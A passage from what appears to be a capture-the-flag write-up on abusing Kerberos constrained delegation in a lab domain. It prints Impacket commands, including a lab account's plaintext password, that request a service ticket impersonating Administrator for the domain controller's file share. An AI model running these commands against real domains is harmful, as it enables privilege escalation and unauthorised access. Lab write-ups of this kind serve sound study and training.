``svc.scanner`` account is configured for constrained delegation toward services on ``DC01``.

The important server is:
````
cifs/DC01
cifs/DC01.ctf.local
````
``cifs`` is the SMB file-sharing service.

That is why the next attack uses a Kerberos service ticket for ``cifs/DC01.ctf.local`` and then accesses the machine through SMB.




### Verify the delegation one more time

````
findDelegation.py ctf.local/svc.scanner:'1summerlove!' -dc-ip 10.49.191.80
````

But in this we need to creat hostname:
````
echo "10.128.146.136 dc01.ctf.local dc01 ctf.local" | sudo tee -a /etc/hosts
````

````
getST.py -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip 10.49.191.80 ctf.local/svc.scanner:'1summerlove!'
````
